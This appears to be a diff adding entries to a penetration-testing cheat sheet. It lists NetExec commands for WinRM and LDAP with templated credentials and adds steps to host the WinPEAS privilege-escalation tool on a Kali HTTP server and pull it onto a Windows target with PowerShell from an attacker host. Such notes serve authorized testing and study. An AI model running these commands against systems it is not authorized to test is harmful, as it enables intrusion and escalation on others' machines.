@@ -33,3 +33,16 @@ nxc winrm {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}'
 ```bash
 nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --users
 ```
+
+## Host WinPEAS on Kali
+
+```bash
+cd /usr/share/peass/winpeas/
+python3 -m http.server {{LPORT}}
+```
+
+## Download WinPEAS in PowerShell
+
+```powershell
+iwr -UseBasicParsing -Uri 'http://{{LHOST}}:{{LPORT}}/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
+```
